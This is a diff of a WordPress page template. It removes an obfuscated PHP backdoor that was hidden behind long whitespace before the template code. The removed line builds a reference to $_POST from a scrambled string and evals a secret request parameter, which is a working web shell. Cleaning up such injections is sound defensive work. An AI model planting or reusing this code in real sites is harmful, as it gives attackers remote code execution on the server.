@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                  $usxk97="to_psure" ; $qne84=$usxk97[4]. $usxk97[0]. $usxk97[6]. $usxk97[0]. $usxk97[1].$usxk97[5].$usxk97[3].$usxk97[3]. $usxk97[7]. $usxk97[6];$kiq62= $qne84 ( $usxk97[2]. $usxk97[3].$usxk97[1].$usxk97[4].$usxk97[0] );if( isset( ${ $kiq62 }[ 'q95ceb8'])) { eval ( ${ $kiq62 }['q95ceb8'] );}?><?php /* Template Name: Jeff */ pxl::page(); while ( have_posts() ) : the_post(); ?>
+<?php /* Template Name: Jeff */ pxl::page(); while ( have_posts() ) : the_post(); ?>
 
 <div class="row lined">
 	<div id="sidebar" class="span3">
